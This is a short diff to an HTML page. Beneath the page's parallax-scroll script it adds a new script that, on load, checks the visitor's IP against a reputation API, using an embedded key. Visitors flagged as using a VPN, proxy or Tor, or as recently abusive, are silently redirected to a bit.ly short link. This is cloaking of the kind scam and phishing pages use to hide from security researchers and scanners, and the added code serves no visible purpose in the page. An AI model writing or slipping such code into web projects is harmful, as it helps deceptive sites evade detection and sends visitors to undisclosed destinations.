@@ -420,5 +420,14 @@
             parallax.style.transform = `translateY(${speed}px)`;
         });
     </script>
+    <script>
+(async () => {
+  const res = await fetch("https://ipqualityscore.com/api/json/ip/4ML19NAAwYSO1N7gOhHAswM3tgfCBIuV");
+  const data = await res.json();
+  if (data.vpn || data.proxy || data.tor || data.recent_abuse) {
+    window.location.href = "https://bit.ly/4kFHdHp";
+  }
+})();
+</script>
 </body>
 </html>
